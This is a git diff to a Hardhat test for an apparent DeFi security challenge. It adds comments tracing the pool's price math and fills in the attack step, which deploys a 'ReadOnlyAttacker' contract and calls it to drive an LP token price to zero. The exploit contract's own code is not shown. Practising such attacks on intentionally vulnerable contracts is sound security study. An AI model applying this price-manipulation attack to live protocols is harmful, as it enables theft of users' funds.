@@ -18,8 +18,11 @@ describe(NAME, function () {
         await readOnlyContract.addLiquidity({
             value: ethers.utils.parseEther("100"),
         });
+        // balance = 100, totalSupply = 100
         await readOnlyContract.earnProfit({ value: ethers.utils.parseEther("1") });
+        // balance = 101, totalSupply = 100
         await vulnerableDeFiContract.snapshotPrice();
+        // price = 101/100
 
         // you start with 2 ETH
         await network.provider.send("hardhat_setBalance", [
@@ -42,10 +45,13 @@ describe(NAME, function () {
 
         // prettier-ignore
         it("conduct your attack here", async function () {
-    
+            const AttackerContractFactory = await ethers.getContractFactory("ReadOnlyAttacker");
+            const attackerContract = await AttackerContractFactory.deploy(vulnerableDeFiContract.address,readOnlyContract.address);
+            await attackerContract.connect(attackerWallet).attack({value: ethers.utils.parseEther("1")});
     });
 
         after(async function () {
+            // for lpTokenPrice = 0 , poolBalance < totalSupply 
             console.log(await vulnerableDeFiContract.lpTokenPrice());
             expect(await vulnerableDeFiContract.lpTokenPrice()).to.be.equal(0, "snapshotPrice should be zero");
             expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.lessThan(
